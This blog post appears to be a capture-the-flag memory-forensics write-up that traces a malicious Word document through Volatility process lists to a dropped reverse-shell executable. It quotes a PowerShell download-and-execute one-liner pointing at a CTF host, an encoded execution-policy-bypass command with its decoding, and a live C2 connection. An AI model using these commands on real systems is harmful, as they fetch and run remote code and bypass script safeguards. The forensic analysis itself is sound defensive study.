---
layout: post
title: "Memory Analysis"
date: 2025-05-23 11:00:00 +0800
categories: [intern, forensic, memory analysis]
tags: [writeup,forensics, memory,intern]
image: https://miro.medium.com/v2/resize:fit:786/format:webp/1*RNKFWrN0zhqGg4c8LQaz6A.png
---

# 🧠 ***Memory Analysis***

Analysis on a memdump file which is a snapshot of the memory systems RAM on the current time.

Analyzed the memdump file using votality workbech. Using the pslist command to list all the process list of the file at the current time of the state of the system.


<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*RNKFWrN0zhqGg4c8LQaz6A.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>The process list</em></figcaption>
</figure>

From the list the `WINWORD.exe` file seems suspicious. This is because after the `WINWORD.exe` file it executes a cmd.exe which is not usual for a word apps to execute cmd.

Use pstree command to view the hierachal process of the `WINWORD.exe`. To see the flow of the exe file by determining which is the parents and child process.

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*yoVIEC9HxsvFUuc_DAne3w.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>process tree winword.exe</em></figcaption>
</figure>

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*ray0zD1oDdCO70RwmKROAw.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>process tree kitty.exe</em></figcaption>
</figure>

Based on the process tree `WINWORD.exe` is the parent process. When executed it will spawn another process `cmd.exe` (child process).

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*D6eIK7w6ZIe8sOsOD4Aq4g.png" alt="Process List" style="width:100%;">
</figure>

The `WINWORD.exe` will open a file `financial-rep.docx`. Then it will open a cmd to execute power shell command to download a ps1 power shell script file.

``` powershell
IEX(New-Object Net.WebClient).DownloadString
('http://ticket.itrexc2023.capturextheflag.io:8080/cat.ps1')

```

Out of curiosity, how does file `financial-rep.docx` exist in `C:\Users\azman\Downloads\` .

Used the process time to determine how the file is created in the downloads.

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*bFySk_5oGeLzh460nVtXFw.png" alt="Process List" style="width:100%;">
</figure>


The winword.exe process created time is at 02:00:40 on the date 18/10. So searched for process that was created before that time on the same date.

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*vbJ7vu7UNwNiQquv0h6iRQ.png" alt="Process List" style="width:100%;">
</figure>

```
 C:\Program Files\Mozilla Thunderbird\thunderbird.exe
```

Thunderbird process was the nearest time before the winword.exe is ran. Mozilla Thunderbird is a free, open-source email client that you install on your computer.

This suggest that user(Azman) received an e-mail from thunderbird and downloaded financial.docx the malicious file through e-mail.

Using IEX cmdlet the executable will download cat.ps1 the ticket.itrexc2023.capturextheflag website.

```
6852 WINWORD.EXE 0x7ff8d3cb0000 0x7ff8d3cbffff VadS PAGE_EXECUTE_READWRITE 
```

From the powershell comand `cat.ps1` is used to download `kitty.exe`.

Reasons why `cat.ps1` Dropped `kitty.exe`

1. cat.ps1 was fetched and run at 02:00:59 UTC via PID 2144
2. Soon after, a new PowerShell chain (5960 → 3856) launches at 02:02:41
3. kitty.exe shows up at 02:15:23 in the Temp folder C:\Users\azman\AppData\Local\Temp\kitty.exe


Another cmd.exe is also open that will execute powershell.exe

``` 

powershell.exe  -nop -e UwBlAHQALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBTAGMAbwBwAGUAIABDAHUAcgByAGUAbgB0AFUAcwBlAHIAOwAgAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABUAGEAcwBrAHMAXABFAHYAZQBuAHQAVgBpAGUAdwBlAHIAUgBDAEUALgBwAHMAMQA=
```

Decoded base64

```
Set-ExecutionPolicy Bypass -Scope CurrentUser;
 C:\Windows\Tasks\EventViewerRCE.ps1
```


PowerShell’s execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts.

Prior to the execution of kitty.exe, the parent process executed the command Set-ExecutionPolicy Bypass -Scope CurrentUser; C:\Windows\Tasks\EventViewerRCE.ps1, indicating that PowerShell’s execution policy was bypassed to run the EventViewerRCE.ps1 script.

This script likely executedkitty.exe, suggesting that kitty.exe was spawned as part of a malicious PowerShell activity chain.

# **Process flow**

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:640/format:webp/1*CrGLQjXZ73PGhKFflmNY7w.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>The flow of process</em></figcaption>
</figure>


Dump the memory of `kitty exe` and the scan it in using virus total.

<figure>
  <img src="https://miro.medium.com/v2/resize:fit:786/format:webp/1*OC7GY-mQJmzHNCIszbHZrA.png" alt="Process List" style="width:100%;">
  <figcaption style="text-align:center;"><em>the status on virus total</em></figcaption>
</figure>

Use netstat to scan and analyze network statistic for the process.

```
0xa0039d0ee8a0 
TCPv4 192.168.x.x 51205 137.184.90.246 9000 
ESTABLISHED 6572 kitty.exe 2023-10-18 02:15:24.000000 UTC

```

A connection is established between the process `kitty.exe` with **PID 6572** on the machine at IP address **192.168.x.x** and a remote server at IP address **137.184.90.246** on port **9000**.

Data transfer is currently enabled through this connection.

Port 9000 on the remote server is believed to be hosting a service with which the process is communicating.

# **kitty.exe behavior**

1. `kitty.exe` is a suspicious executable located in the Temp folder.
2. `kitty.exe` has an active network connection (to a remote IP and port), indicating it’s communicating outward, which reverse shells do to connect  back to an attacker.

This behavior suggests that kitty.exe is likely a reverse shell or backdoor used by an attacker to gain remote access and control over the system.


---

While I’ve learned a lot during this analysis, I know there’s still so much more to explore in the world of malware forensics and incident response. 🚀
I’ll keep learning, experimenting, and sharing new findings here! ✍️📚

---
👉 This post is also on my medium [Read on Medium](https://medium.com/@haziqzulkifl1020/memory-analysis-a82ad9b59e5b)